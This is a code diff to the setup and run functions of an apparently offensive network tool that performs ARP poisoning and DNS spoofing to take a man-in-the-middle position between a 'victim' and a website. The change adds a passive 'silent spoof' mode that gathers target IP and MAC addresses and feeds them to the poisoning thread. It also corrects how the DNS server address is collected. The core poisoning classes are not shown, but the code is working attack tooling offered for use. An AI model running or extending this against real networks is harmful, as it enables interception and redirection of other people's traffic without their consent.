@@ -99,6 +99,8 @@ def setup():
                 print(f"! Invalid interface. Please choose an interface from the following list: {ifaces}")
                 args.interface = input("> Choose an interface: ").strip()
 
+            silent_spoof = False
+            target_macs = dict()
             probe = input("> Probe subnet for available targets? [y/n] ").strip().lower()
             if probe == "y" or probe == "yes":
                 nm = nmap.PortScanner()
@@ -107,6 +109,7 @@ def setup():
                 targets = nm.all_hosts()
             else:
                 targets = []
+                silent_spoof = True
                 stop_silent = threading.Event()
                 silent = Silent(args.interface)
                 silent_thread = threading.Thread(
@@ -122,6 +125,8 @@ def setup():
                             stop_silent.set()
                             silent_thread.join()
                         break
+                targets = silent.target_ips
+                target_macs = silent.target_macs
 
             args.target = input("> Input the victim IP address: ").strip()
             while args.target not in targets:
@@ -132,12 +137,13 @@ def setup():
             while args.website not in targets:
                 print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
                 args.website = input("> Input the website IP address: ").strip()
+            
+            args.dns = input("> Input the DNS server IP address: ").strip()
 
-            args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
+            args.aggressiveness = int(input("> Aggressiveness of poisoning (1-10): ").strip())
             while not 1 <= args.aggressiveness <= 10:
                 print("! Invalid number. Aggressiveness must be between 1 and 10")
-                args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
-            args.website = input("> DNS server IP address: ").strip()
+                args.aggressiveness = int(input("> Aggressiveness of poisoning (1-10): ").strip())
 
             args.forward = input("> Forward packets during ARP poisoning? [y/n] ").strip().lower()
             if args.forward == "y" or args.forward == "yes":
@@ -162,17 +168,19 @@ def setup():
         args.website,
         args.dns,
         args.aggressiveness,
-        forward
+        forward,
+        silent_spoof,
+        target_macs
     )
 
-def run(iface, victim, website, dns, timer, forward):
+def run(iface, victim, website, dns, timer, forward, silent_spoof, target_macs):
     stop_event = threading.Event()
 
     # Poison ARP in a separate thread (to maintain MitM position)
     arp = ARPPoison(iface, victim, website)
     arp_thread = threading.Thread(
         target=arp.attack,
-        args=(timer, forward, stop_event,)
+        args=(timer, forward, silent_spoof, target_macs, stop_event,)
     )
 
     # Spoof DNS in a separate thread
@@ -210,7 +218,7 @@ def run(iface, victim, website, dns, timer, forward):
 
         dns_spoofer.disable_dns_block()
 
-        restore = input("Restore ARP tables? [y/n] ").strip().lower()
+        restore = input("> Restore ARP tables? [y/n] ").strip().lower()
         if restore == "y" or restore == "yes":
             arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
             if arp.dnsIP:
@@ -225,5 +233,5 @@ if __name__ == "__main__":
     scapy.conf.verb = 0
     logging.getLogger("scapy").setLevel(logging.ERROR)
 
-    iface, victim, website, dns, timer, forward = setup()
-    run(iface, victim, website, dns, timer, forward)
+    iface, victim, website, dns, timer, forward, silent_spoof, target_macs = setup()
+    run(iface, victim, website, dns, timer, forward, silent_spoof, target_macs)
